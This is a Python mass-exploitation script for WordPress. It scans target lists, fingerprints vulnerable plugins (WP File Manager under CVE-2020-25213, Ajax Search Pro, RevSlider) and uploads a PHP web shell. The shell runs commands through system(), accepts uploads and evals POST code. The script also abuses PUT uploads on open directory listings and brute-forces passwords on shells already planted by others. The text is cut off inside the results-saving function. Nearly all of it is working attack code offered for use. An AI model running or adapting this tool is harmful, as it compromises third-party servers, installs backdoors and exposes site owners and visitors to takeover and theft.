import requests
import re
import time
import os
import sys
import json
import random
import string
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import threading

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JUDOL_KEYWORDS = [
    'slot', 'gacor', 'deposit', 'bonus', 'jackpot', 'rtp', 'pragmatic', 
    'pg soft', 'togel', 'casino', 'zeus', 'olympus', 'maxwin', 'scatter',
    'mahjong', 'ways', 'wild', 'bet', 'judi', 'bola', 'poker', 'situs'
]

SHELL_REGEX_PATTERNS = [
    r'uid=\d+\(.*\)',
    r'gid=\d+\(.*\)',
    r'Current Dir:',
    r'File Manager',
    r'Upload File',
    r'Execute Command',
    r'wso_ver',
    r'b374k',
    r'IndoXploit',
    r'WSO\s*[\d\.]+',
    r'Shell\s*v\d+',
    r'C99Shell',
    r'R57Shell',
    r'ALFA\s*TEaM',
    r'Leaf\s*Mailer',
    r'Mau\s*Upload\s*Apa',
    r'Uname:',
    r'multipart/form-data',
    r'type="file"',
    r'name="cmd"',
    r'eval\(base64_decode',
    r'FilesMan',
    r'WebShell',
    r'Mini\s*Shell',
    r'Priv8',
    r'Angel\s*Shell',
    r'g6\s*shell',
    r'h4x0r',
    r'input\s*name\s*=\s*["\']?cmd["\']?',
    r'input\s*name\s*=\s*["\']?pass["\']?',
    r'type\s*=\s*["\']?submit["\']?',
    r'value\s*=\s*["\']?execute["\']?',
    r'Symlink',
    r'Zone-H',
    r'linux',
    r'windows',
    r'drwxr',
    r'Safe_mode',
    r'Disable_functions',
    r'Open_basedir',
    r'php_uname',
    r'posix_getpwuid',
    r'disk_total_space'
]

SHELL_TITLE_REGEX = [
    r'WSO', r'Shell', r'b374k', r'IndoXploit', r'File Manager', r'Priv8', 
    r'Mini Shell', r'MadSpot', r'C99', r'R57', r'Remot', r'Hacked', 
    r'Defaced', r'Upload', r'Bypass', r'Root', r'Command', r'Backdoor',
    r'Mailer', r'0x', r'pwn', r'Admin', r'Dashboard'
]

WP_VULN_PLUGINS = [
    {'name': 'wp-file-manager', 'path': 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 'keywords': ['errUnknownCmd', 'json', 'currentFolder']},
    {'name': 'wp-file-manager-old', 'path': 'wp-content/plugins/wp-file-manager/lib/php/connector.php', 'keywords': ['errUnknownCmd', 'json', 'currentFolder']},
    {'name': 'ajax-search-pro', 'path': 'wp-content/plugins/ajax-search-pro/js/file_upload.php', 'keywords': ['0', 'error', 'upload']},
    {'name': 'revslider', 'path': 'wp-content/plugins/revslider/temp/update_extract/revslider/update.php', 'keywords': ['revslider', 'update', 'failed']},
]

SHELL_PASSWORD = "aezeron"
SHELL_CONTENT = """<?php
$pass = "aezeron";
if(isset($_REQUEST['p']) && $_REQUEST['p']==$pass){
    echo "Aezeron Shell Active";
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        system($_REQUEST['cmd']);
        echo "</pre>";
        die;
    }
    if(isset($_FILES['f'])){
        if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
            echo "Upload Success";
        }
    }
    die;
}
if(isset($_POST['code'])){
    eval($_POST['code']);
    die;
}
echo "WordPress Shell by Exploiter";
?>"""

class WPFileManagerExploit:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

    def _random_ip(self):
        return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

    def is_shell(self, content):
        if not content:
            return False
        for pattern in SHELL_REGEX_PATTERNS:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def verify_shell(self, url):
        try:
            resp = self.session.get(url, timeout=10, allow_redirects=True)
            if resp.status_code != 200 or 'wp-login.php' in resp.url:
                return False

            content = resp.text
            content_lower = content.lower()

            if not content.strip() or len(content) < 50:
                return False
            
            negative_keywords = [
                '404 not found', 'page not found', 'error 404', 'forbidden', 
                'access denied', 'internal server error', 'user_login', 'user_pass', 
                'wp-submit', 'loginform'
            ]
            negative_keywords.extend(JUDOL_KEYWORDS)
            if any(x in content_lower for x in negative_keywords):
                return False

            check_url = f"{url}?p={SHELL_PASSWORD}"
            resp_pass = self.session.get(check_url, timeout=5)
            if resp_pass.status_code == 200 and "Aezeron Shell Active" in resp_pass.text:
                return True

            has_shell_title = False
            title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE)
            if title_match:
                title = title_match.group(1).strip()
                for pattern in SHELL_TITLE_REGEX:
                    if re.search(pattern, title, re.IGNORECASE):
                        has_shell_title = True
                        break
            
            content_pattern_score = 0
            for pattern in SHELL_REGEX_PATTERNS:
                if re.search(pattern, content, re.IGNORECASE):
                    content_pattern_score += 1

            if has_shell_title or content_pattern_score >= 3:
                return True

            return False
        except:
            return False
    
    def brute_force_shell(self, url):
        passwords = [
            'admin', 'pass', 'password', '123456', 'root', 'toor', 'qwerty', 
            'indoxploit', 'b374k', 'ganteng', '123', '1', 'a', 'admin123', 
            'aezeron', 'leaf', 'blue', 'hacker'
        ]
        params = ['p', 'pass', 'password', 'pw', 'key', 'code', 'cmd']
        
        try:
            for pwd in passwords:
                for param in params:
                    try:
                        check_url = f"{url}?{param}={pwd}"
                        resp = self.session.get(check_url, timeout=3)
                        if resp.status_code == 200 and any(x in resp.text for x in ['Current Dir:', 'File Manager', 'Upload File', 'uid=']) and 'type="password"' not in resp.text:
                            return pwd, param
                        
                        resp = self.session.post(url, data={param: pwd}, timeout=3)
                        if resp.status_code == 200 and any(x in resp.text for x in ['Current Dir:', 'File Manager', 'Upload File', 'uid=']) and 'type="password"' not in resp.text:
                            return pwd, param
                    except:
                        continue
        except:
            pass
        return None, None

    def exploit_index_of(self, url):
        try:
            shell_name = f"sh_{random.randint(1000,9999)}.php"
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            resp = self.session.put(urljoin(url, shell_name), data=SHELL_CONTENT, headers=headers, timeout=10)
            if resp.status_code in [200, 201, 204]:
                if self.verify_shell(urljoin(url, shell_name)):
                    return True, urljoin(url, shell_name)
            
            files = {'file': (shell_name, SHELL_CONTENT, 'application/x-php')}
            resp = self.session.post(url, files=files, timeout=10)
            if resp.status_code == 200:
                 if self.verify_shell(urljoin(url, shell_name)):
                    return True, urljoin(url, shell_name)
        except:
            pass
        return False, None
    
    def check_version_cve_2020_25213(self, target_url):
        """Check wp-file-manager version for CVE-2020-25213"""
        readme_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/readme.txt')
        
        try:
            response = self.session.get(readme_url, timeout=5)
            if response.status_code == 200:
                version_match = re.search(r'== Changelog ==.*?(\d+\.\d+)', response.text, re.DOTALL)
                if version_match:
                    version = version_match.group(1)
                    print(f"    [+] Found wp-file-manager version: {version}")
                    
                    try:
                        version_parts = version.split('.')
                        version_float = float(f"{version_parts[0]}.{version_parts[1]}")
                        
                        if 6.0 <= version_float <= 6.8:
                            print(f"    [+] Version {version} is vulnerable to CVE-2020-25213")
                            return True
                        else:
                            print(f"    [-] Version {version} is not vulnerable (requires 6.0-6.8)")
                            return False
                    except:
                        print(f"    [-] Unable to parse version number")
                        return None
                else:
                    print(f"    [-] Unable to detect version")
                    return None
            else:
                return None
        except Exception as e:
            return None
    
    def exploit_cve_2020_25213(self, target_url, auto_shell=True):
        """
        CVE-2020-25213: WP File Manager 6.0-6.8 Unauthenticated RCE
        Original exploit by Mansoor R (@time4ster)
        """
        print(f"\n  {CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
        
        # First check version
        print(f"    {CYAN}[*]{RESET} Checking plugin version...")
        version_vuln = self.check_version_cve_2020_25213(target_url)
        
        endpoint_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
        
        # Check if endpoint is vulnerable
        try:
            check_response = self.session.get(endpoint_url, timeout=5)
            if check_response.status_code == 200:
                try:
                    json_response = check_response.json()
                    if 'error' in json_response and 'errUnknownCmd' in str(json_response['error']):
                        print(f"    {GREEN}[+]{RESET} Target vulnerable to CVE-2020-25213")
                    else:
                        print(f"    {RED}[-]{RESET} Target not vulnerable to CVE-2020-25213")
                        return False, "Not vulnerable to CVE-2020-25213"
                except:
                    print(f"    {RED}[-]{RESET} Target not vulnerable to CVE-2020-25213")
                    return False, "Not vulnerable to CVE-2020-25213"
            else:
                print(f"    {RED}[-]{RESET} Endpoint not accessible")
                return False, "Endpoint not accessible"
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error checking vulnerability: {str(e)}")
            return False, f"Error: {str(e)}"
        
        # If auto_shell, upload a shell using the exact exploit payload
        if auto_shell:
            print(f"    {CYAN}[*]{RESET} Uploading shell via CVE-2020-25213...")
            shell_name = f"cve_shell_{random.randint(1000, 9999)}.php"
            
            # Create temporary file with shell content
            temp_shell = f"/tmp/{shell_name}"
            try:
                with open(temp_shell, 'w') as f:
                    f.write(SHELL_CONTENT)
                
                # Exact payload from the bash exploit
                files = {
                    'upload[]': (shell_name, open(temp_shell, 'rb'), 'application/x-php')
                }
                
                data = {
                    'reqid': '17457a1fe6959',
                    'cmd': 'upload',
                    'target': 'l1_Lw',
                    'mtime[]': '1576045135'
                }
                
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                exploit_response = self.session.post(endpoint_url, files=files, data=data, headers=headers, timeout=10)
                
                # Clean up temp file
                os.remove(temp_shell)
                
                if exploit_response.status_code == 200:
                    try:
                        json_response = exploit_response.json()
                        if 'added' in json_response and len(json_response['added']) > 0:
                            shell_path = json_response['added'][0].get('url')
                            if shell_path:
                                full_shell_url = urljoin(target_url, shell_path)
                                if self.verify_shell(full_shell_url):
                                    print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {full_shell_url}?p={SHELL_PASSWORD}")
                                    return True, f"CVE-2020-25213 Shell: {full_shell_url}?p={SHELL_PASSWORD}"
                    except:
                        # Try alternative path
                        alt_url = urljoin(target_url, f'wp-content/plugins/wp-file-manager/lib/files/{shell_name}')
                        if self.verify_shell(alt_url):
                            print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {alt_url}?p={SHELL_PASSWORD}")
                            return True, f"CVE-2020-25213 Shell: {alt_url}?p={SHELL_PASSWORD}"
                        
                        # Check if shell.php was uploaded
                        shell_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/../files/shell.php')
                        if self.verify_shell(shell_url):
                            print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {shell_url}?p={SHELL_PASSWORD}")
                            return True, f"CVE-2020-25213 Shell: {shell_url}?p={SHELL_PASSWORD}"
                
                print(f"    {RED}[-]{RESET} CVE-2020-25213 exploit failed")
                return False, "Exploit failed"
                
            except Exception as e:
                if os.path.exists(f"/tmp/{shell_name}"):
                    os.remove(f"/tmp/{shell_name}")
                print(f"    {RED}[-]{RESET} CVE-2020-25213 error: {str(e)}")
                return False, f"Error: {str(e)}"
        
        return True, "Target vulnerable to CVE-2020-25213"
    
    def exploit_wp_file_manager(self, target_url):
        # First try the specific CVE-2020-25213 exploit
        success, msg = self.exploit_cve_2020_25213(target_url, auto_shell=True)
        if success:
            return success, msg
        
        # Fall back to original exploit method
        exploit_paths = [
            'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
            'wp-content/plugins/wp-file-manager/lib/php/connector.php'
        ]
        
        for path in exploit_paths:
            exploit_url = urljoin(target_url, path)
            
            try:
                check_response = self.session.get(exploit_url, timeout=5)
                
                if check_response.status_code == 200:
                    files = {
                        'upload[]': ('shell.php', SHELL_CONTENT, 'application/x-php')
                    }
                    
                    data = {
                        'cmd': 'upload',
                        'target': 'l1_',
                        'reqid': '174117272919' + str(random.randint(100, 999))
                    }
                    
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Referer': urljoin(target_url, 'wp-admin/admin.php?page=wp_file_manager')
                    }
                    
                    exploit_response = self.session.post(exploit_url, files=files, data=data, headers=headers, timeout=10)
                    
                    if exploit_response.status_code == 200:
                        try:
                            json_response = exploit_response.json()
                            if 'added' in json_response and len(json_response['added']) > 0:
                                shell_path = json_response['added'][0].get('url', json_response['added'][0].get('name'))
                                full_shell_url = urljoin(target_url, shell_path)
                                
                                if self.verify_shell(full_shell_url):
                                    return True, f"Shell uploaded: {full_shell_url}?p={SHELL_PASSWORD}"
                        except:
                            if 'shell.php' in exploit_response.text or 'added' in exploit_response.text:
                                shell_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/../files/shell.php')
                                if self.verify_shell(shell_url):
                                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
                    
                    return False, f"Exploit attempt failed"
                
            except Exception as e:
                continue
        
        return False, "File Manager not vulnerable"
    
    def exploit_ajax_search_pro(self, target_url):
        exploit_path = 'wp-content/plugins/ajax-search-pro/js/file_upload.php'
        exploit_url = urljoin(target_url, exploit_path)
        
        try:
            check_response = self.session.get(exploit_url, timeout=5)
            
            if check_response.status_code == 200:
                files = {
                    'files[]': ('shell.php', SHELL_CONTENT, 'application/x-php')
                }
                
                exploit_response = self.session.post(exploit_url, files=files, timeout=10)
                
                if exploit_response.status_code == 200:
                    try:
                        json_response = exploit_response.json()
                        if 'files' in json_response and len(json_response['files']) > 0:
                            shell_name = json_response['files'][0]['name']
                            shell_url = urljoin(target_url, f'wp-content/plugins/ajax-search-pro/js/{shell_name}')
                            
                            if self.verify_shell(shell_url):
                                return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
                    except:
                        if '.php' in exploit_response.text:
                            shell_url = urljoin(target_url, 'wp-content/plugins/ajax-search-pro/js/shell.php')
                            if self.verify_shell(shell_url):
                                return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
                
                return False, f"Ajax Search Pro exploit failed"
            
            return False, f"Ajax Search Pro not accessible"
            
        except Exception as e:
            return False, f"Ajax Search Pro error: {str(e)}"
    
    def exploit_revslider(self, target_url):
        exploit_path = 'wp-content/plugins/revslider/temp/update_extract/revslider/update.php'
        exploit_url = urljoin(target_url, exploit_path)
        
        try:
            shell_name = f'revshell{random.randint(1000, 9999)}.php'
            
            files = {
                'update_file': (shell_name, SHELL_CONTENT, 'application/x-php')
            }
            
            data = {
                'action': 'revslider_ajax_action',
                'client_action': 'update_plugin'
            }
            
            exploit_response = self.session.post(exploit_url, files=files, data=data, timeout=10)
            
            if exploit_response.status_code == 200:
                shell_url = urljoin(target_url, f'wp-content/plugins/revslider/temp/update_extract/revslider/{shell_name}')
                
                if self.verify_shell(shell_url):
                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
            
            return False, f"RevSlider exploit failed"
            
        except Exception as e:
            return False, f"RevSlider error: {str(e)}"
    
    def brute_force_upload(self, target_url):
        upload_paths = [
            'wp-content/plugins/formidable/php/upload.php',
            'wp-admin/async-upload.php',
            'wp-admin/media-upload.php',
        ]
        
        for path in upload_paths:
            upload_url = urljoin(target_url, path)
            
            try:
                test_response = self.session.get(upload_url, timeout=3)
                
                if test_response.status_code in [200, 403]:
                    shell_name = f'upload_{random.randint(1000, 9999)}.php'
                    
                    files = {
                        'file': (shell_name, SHELL_CONTENT, 'application/x-php'),
                    }
                    
                    upload_response = self.session.post(upload_url, files=files, timeout=10)
                    
                    if upload_response.status_code == 200:
                        possible_paths = [
                            f'wp-content/uploads/{shell_name}',
                            f'wp-content/plugins/formidable/{shell_name}',
                            shell_name
                        ]
                        
                        for shell_path in possible_paths:
                            shell_url = urljoin(target_url, shell_path)
                            try:
                                if self.verify_shell(shell_url):
                                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
                            except:
                                continue
                
            except:
                continue
        
        return False, "Brute force upload failed"

    def attempt_generic_upload(self, target_url):
        try:
            shell_name = f'up_{random.randint(1000, 9999)}.php'
            params = ['file', 'upload', 'Filedata', 'files[]', 'image', 'media']
            
            for param in params:
                try:
                    files = {param: (shell_name, SHELL_CONTENT, 'application/x-php')}
                    resp = self.session.post(target_url, files=files, timeout=10)
                    
                    if resp.status_code == 200:
                        paths = [
                            urljoin(target_url, shell_name),
                            urljoin(target_url, f'wp-content/uploads/{shell_name}'),
                        ]
                        
                        for p in paths:
                            if self.verify_shell(p):
                                return True, f"Shell uploaded: {p}?p={SHELL_PASSWORD}"
                except:
                    continue
        except:
            pass
        return False, "Generic upload failed"

    def crawl_directory_listing(self, url, current_depth=0, max_depth=3):
        found_shells = []
        if current_depth > max_depth:
            return found_shells
            
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                links = re.findall(r'href=["\']?([^"\' >]+)', response.text)
                
                for link in links:
                    link = link.split('?')[0].split('#')[0]
                    
                    if not link or link.startswith('?') or '://' in link or link.startswith('../'):
                        continue
                        
                    full_url = urljoin(url, link)
                    
                    if not full_url.startswith(url):
                        continue

                    ext = os.path.splitext(link)[1].lower()

                    if ext in ['.php', '.phtml', '.php5']:
                        try:
                            if self.verify_shell(full_url):
                                found_shells.append(f"{full_url}?p={SHELL_PASSWORD}")
                                print(f"    {GREEN}[FOUND]{RESET} Shell found: {full_url}")
                        except:
                            pass
                    
                    elif link.endswith('/'):
                        if full_url.rstrip('/') != url.rstrip('/'):
                            found_shells.extend(self.crawl_directory_listing(full_url, current_depth + 1, max_depth))
                        
        except:
            pass
        return found_shells
    
    def check_writable_directories(self, target_url):
        test_directories = [
            'wp-content/uploads/',
            'wp-content/plugins/',
            'wp-content/themes/',
        ]
        
        found_shells = []
        writable_dirs = []
        
        for directory in test_directories:
            test_url = urljoin(target_url, directory)
            
            try:
                response = self.session.get(test_url, timeout=3)
                
                if response.status_code == 200:
                    if 'Index of' in response.text or '<title>Index of' in response.text:
                        writable_dirs.append(directory)
                        print(f"{GREEN}[+]{RESET} Directory listing enabled: {test_url}")
                        
                        idx_success, idx_shell = self.exploit_index_of(test_url)
                        if idx_success:
                            found_shells.append(f"{idx_shell}?p={SHELL_PASSWORD}")
                            print(f"{GREEN}[SHELL]{RESET} Index Of Exploit Success: {idx_shell}")
                        
                        shells = self.crawl_directory_listing(test_url)
                        if shells:
                            found_shells.extend(shells)
            except:
                pass
        
        return writable_dirs, found_shells
    
    def auto_exploit(self, target_url):
        results = {
            'file_manager': False,
            'ajax_search': False,
            'revslider': False,
            'brute_upload': False,
            'cve_2020_25213': False,
            'shell_urls': [],
            'details': []
        }
        
        print(f"{CYAN}[*]{RESET} Checking writable directories...")
        writable_dirs, found_shells = self.check_writable_directories(target_url)
        if writable_dirs:
            results['details'].append(f"Writable directories: {', '.join(writable_dirs)}")
        if found_shells:
            results['shell_urls'].extend(found_shells)
        
        # Test CVE-2020-25213 specifically
        print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
        cve_result, cve_msg = self.exploit_cve_2020_25213(target_url, auto_shell=True)
        results['cve_2020_25213'] = cve_result
        results['details'].append(f"[CVE-2020-25213] {cve_msg}")
        if cve_result and "Shell" in cve_msg:
            shell_part = cve_msg.split(': ')[1] if ': ' in cve_msg else cve_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        print(f"{CYAN}[*]{RESET} Testing WP File Manager exploit...")
        fm_result, fm_msg = self.exploit_wp_file_manager(target_url)
        results['file_manager'] = fm_result
        results['details'].append(f"[FileManager] {fm_msg}")
        if fm_result:
            shell_part = fm_msg.split(': ')[1] if ': ' in fm_msg else fm_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        print(f"{CYAN}[*]{RESET} Testing Ajax Search Pro exploit...")
        ajax_result, ajax_msg = self.exploit_ajax_search_pro(target_url)
        results['ajax_search'] = ajax_result
        results['details'].append(f"[AjaxSearch] {ajax_msg}")
        if ajax_result:
            shell_part = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        print(f"{CYAN}[*]{RESET} Testing RevSlider exploit...")
        rev_result, rev_msg = self.exploit_revslider(target_url)
        results['revslider'] = rev_result
        results['details'].append(f"[RevSlider] {rev_msg}")
        if rev_result:
            shell_part = rev_msg.split(': ')[1] if ': ' in rev_msg else rev_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        print(f"{CYAN}[*]{RESET} Testing brute force upload...")
        brute_result, brute_msg = self.brute_force_upload(target_url)
        results['brute_upload'] = brute_result
        results['details'].append(f"[BruteUpload] {brute_msg}")
        if brute_result:
            shell_part = brute_msg.split(': ')[1] if ': ' in brute_msg else brute_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        if not any([fm_result, ajax_result, rev_result, brute_result, cve_result]):
            results['details'].append("All exploit attempts failed")
        
        return results

def scan_vulnerable_plugins(target_url, max_workers=10):
    results = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for plugin in WP_VULN_PLUGINS:
            test_url = urljoin(target_url, plugin['path'])
            keywords = plugin.get('keywords', [])
            futures.append(executor.submit(check_plugin_vulnerability, test_url, plugin['name'], keywords))
        
        for future in as_completed(futures):
            try:
                result = future.result(timeout=3)
                if result.get('vulnerable', False):
                    results.append(result)
            except:
                continue
    
    return results

def check_plugin_vulnerability(url, plugin_name, keywords=None):
    try:
        response = requests.get(url, timeout=5, verify=False, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        if response.status_code == 200:
            content = response.text
            
            if not content.strip() or len(content) < 10:
                return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

            if 'wp-login.php' in response.url:
                return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

            if any(x in content.lower() for x in JUDOL_KEYWORDS):
                return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

            if keywords:
                found_keyword = False
                for keyword in keywords:
                    if keyword.lower() in content.lower():
                        found_keyword = True
                        break
                
                if not found_keyword:
                    return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

            return {'plugin': plugin_name, 'url': url, 'vulnerable': True, 'status_code': response.status_code}
        else:
            return {'plugin': plugin_name, 'url': url, 'vulnerable': False}
            
    except Exception as e:
        return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

def check_wordpress_site(base_url):
    wp_indicators = ['wp-content', 'wp-includes', 'wp-admin', 'wp-json']
    
    try:
        response = requests.get(base_url, timeout=5, verify=False)
        content = response.text.lower()
        
        for indicator in wp_indicators:
            if indicator in content:
                return True
        
        login_paths = ['wp-login.php', 'wp-admin']
        for path in login_paths:
            test_url = urljoin(base_url, path)
            try:
                resp = requests.get(test_url, timeout=3, verify=False)
                if resp.status_code == 200:
                    return True
            except:
                continue
    except:
        pass
    
    return False

def scan_single_target(target_url, exploit=False):
    result = {
        'url': target_url,
        'is_wordpress': False,
        'vulnerable_plugins': [],
        'exploit_results': {},
        'shell_urls': []
    }
    
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    result['url'] = target_url
    
    try:
        result['is_wordpress'] = check_wordpress_site(target_url)
    except:
        result['is_wordpress'] = False
    
    if result['is_wordpress']:
        print(f"{GREEN}[+]{RESET} WordPress detected: {target_url}")
        
        plugin_results = scan_vulnerable_plugins(target_url, max_workers=10)
        result['vulnerable_plugins'] = plugin_results
        
        if plugin_results:
            print(f"{YELLOW}[!]{RESET} Found {len(plugin_results)} potentially vulnerable plugins")
            for plugin in plugin_results[:3]:
                print(f"  {CYAN}-{RESET} {plugin['plugin']}: {plugin['url']}")
        
        if exploit:
            exploiter = WPFileManagerExploit()
            
            # Try CVE-2020-25213 first
            print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213 (most reliable)...")
            cve_success, cve_msg = exploiter.exploit_cve_2020_25213(target_url, auto_shell=True)
            if cve_success and "Shell" in cve_msg:
                shell_url = cve_msg.split(': ')[1] if ': ' in cve_msg else cve_msg
                if shell_url not in result['shell_urls']:
                    result['shell_urls'].append(shell_url)
                print(f"  {GREEN}[SHELL]{RESET} {cve_msg}")
            
            if plugin_results:
                print(f"{CYAN}[*]{RESET} Attempting to exploit found plugins...")
                for plugin in plugin_results:
                    name = plugin['plugin']
                    success = False
                    msg = ""

                    if name in ['wp-file-manager', 'wp-file-manager-old']:
                        success, msg = exploiter.exploit_wp_file_manager(target_url)
                    elif name == 'ajax-search-pro':
                        success, msg = exploiter.exploit_ajax_search_pro(target_url)
                    elif name == 'revslider':
                        success, msg = exploiter.exploit_revslider(target_url)

                    if success:
                        shell_url = msg.split(': ')[1] if ': ' in msg else msg
                        if shell_url not in result['shell_urls']:
                            result['shell_urls'].append(shell_url)
                        print(f"  {GREEN}[SHELL]{RESET} {msg}")
            
            exploit_result = exploiter.auto_exploit(target_url)
            result['exploit_results'] = exploit_result
            for shell in exploit_result.get('shell_urls', []):
                if shell not in result['shell_urls']:
                    result['shell_urls'].append(shell)
    
    return result

def mass_scan_targets(targets, max_workers=30, exploit=False):
    results = []
    wp_sites = 0
    vulnerable_sites = 0
    exploited_sites = 0
    shells_uploaded = 0
    total = len(targets)
    completed = 0
    start_time = time.time()
    
    print(f"\n{BLUE}[*]{RESET} Starting WP Exploit Scanner for {CYAN}{total}{RESET} targets")
    if exploit:
        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED (Including CVE-2020-25213)")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_target = {executor.submit(scan_single_target, target, exploit): target for target in targets}
        
        for future in as_completed(future_to_target):
            completed += 1
            try:
                result = future.result(timeout=30)
                
                if result['is_wordpress']:
                    wp_sites += 1
                    
                    is_exploited = bool(result['shell_urls'])
                    is_vuln = bool(result['vulnerable_plugins'])

                    if is_exploited:
                        exploited_sites += 1
                        shells_uploaded += len(result['shell_urls'])
                    if is_vuln:
                        vulnerable_sites += 1

                    if is_exploited:
                        print(f"\n{GREEN}[EXPLOITED]{RESET} {WHITE}{result['url']}{RESET}")
                        print(f"  {GREEN}[SHELL]{RESET} Found {len(result['shell_urls'])} shells")
                        for shell in result['shell_urls']:
                            print(f"    {GREEN}→{RESET} {shell}")

                    elif is_vuln:
                        print(f"\n{RED}[VULN]{RESET} {WHITE}{result['url']}{RESET}")
                        print(f"  {YELLOW}Vulnerable Plugins:{RESET} {len(result['vulnerable_plugins'])}")
                        for plugin in result['vulnerable_plugins'][:3]:
                            print(f"    {CYAN}[+]{RESET} {plugin['plugin']}")
                
                results.append(result)
                
                if completed % 10 == 0:
                    elapsed = time.time() - start_time
                    progress = (completed / total) * 100
                    rate = completed / elapsed if elapsed > 0 else 0
                    
                    print(f"\n{BLUE}[{completed}/{total}]{RESET} {YELLOW}{progress:.1f}%{RESET} | {CYAN}WP: {wp_sites}{RESET} | {RED}Vuln: {vulnerable_sites}{RESET} | {GREEN}Exploited: {exploited_sites}{RESET} | {MAGENTA}Shells: {shells_uploaded}{RESET}")
                        
            except Exception as e:
                print(f"{RED}[ERROR]{RESET} Scan failed: {e}")
    
    total_time = time.time() - start_time
    print(f"\n{GREEN}[+]{RESET} Scan completed in {YELLOW}{total_time:.1f}{RESET} seconds")
    print(f"{CYAN}[+]{RESET} WordPress sites: {GREEN}{wp_sites}{RESET}")
    print(f"{RED}[+]{RESET} Vulnerable sites: {YELLOW}{vulnerable_sites}{RESET}")
    print(f"{GREEN}[+]{RESET} Exploited sites: {MAGENTA}{exploited_sites}{RESET}")
    print(f"{GREEN}[+]{RESET} Shells uploaded: {MAGENTA}{shells_uploaded}{RESET}")
    
    return results

def load_targets(filename):
    targets = []
    seen = set()
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    line = line.split('#')[0].strip()
                    
                    if '://' not in line:
                        line = 'http://' + line
                    
                    if line not in seen:
                        seen.add(line)
                        targets.append(line)
    except Exception as e:
        print(f"{RED}[!]{RESET} Error loading file: {e}")
    
    return targets

def save_results(results, filename="wp_exploit_results.txt"):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 100 + "\n")
            f.write("WORDPRESS EXPLOIT SCANNER RESULTS (Including CVE-2020-25213)\n")
            f.write("=" * 100 + "\n\n")
            
            wp_count = len([r for r in results if r['is_wordpress']])
            vuln_count = len([r for r in results if r['vulnerable_plugins']])
            exploited_count = len([r for r in results if r['shell_urls']])
            shell_count = sum(len(r['shell_urls']) for r in results)
            
            f.write(f"SUMMARY:\n")
            f.write(f"- Total targets: {len(results)}\n")
            f.write(f"- WordPress sites: {wp_count}\n")
            f.write(f"- Vulnerable sites: {vuln_count}\n")
            f.write(f"- Exploited sites: {exploited_count}\n")
            f.write(f"- Shells uploaded: {shell_count}\n")
            f.write("=" * 100 + "\n\n")
            
            if vuln_count > 0:
                f.write("VULNERABLE SITES:\n")
                f.write("=" * 100 + "\n\n")
                
                for result in results:
                    if result['vulnerable_plugins']:
                        f.write(f"URL: {result['url']}\n")
